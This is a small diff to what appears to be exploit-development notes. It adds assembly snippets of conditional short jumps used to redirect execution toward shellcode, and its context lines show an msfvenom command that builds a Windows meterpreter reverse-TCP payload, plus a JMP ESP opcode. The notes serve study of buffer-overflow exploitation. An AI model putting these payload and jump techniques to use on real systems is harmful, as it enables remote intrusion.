@@ -153,10 +153,15 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encr
 FFE4                        JMP ESP
 ```
 
-# Short Jumps
+# Other conditional jumps
 ```
 77 08   JA SHORT 00B8FFE6
 76 06   JBE SHORT 00B8FFE6
+```
+```
+019BFFC4   4C               DEC ESP
+019BFFC5   4C               DEC ESP
+019BFFC6  ^77 80            JA SHORT 019BFF48
 ```
 
 # A Much Bigger Jump (400+ bytes), Phrack #62 Article 7 by Aaron Adams 
